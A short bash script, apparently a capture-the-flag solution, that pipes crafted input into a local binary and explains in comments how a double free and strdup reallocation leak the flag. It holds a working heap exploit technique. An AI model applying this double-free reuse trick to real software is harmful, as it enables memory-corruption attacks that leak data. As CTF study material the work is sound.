#!/bin/bash


python -c 'print("flag\n"+"print \n"+"quit")' |./main.elf


# first iteration input = "flag" => ptr1 and ptr3 point to the same address, which is double freed
# using srtdup the same address is alocated again to ptr1 and filled with the flag (now free are address of ptr2 and ptr1==ptr3 again)

# second iteration input = "print "+space(for the second strtok), input gets the free address of ptr2
# target gets the free address of ptr1(ptr3) where the flag is stored and is printed

# third iteration we exit
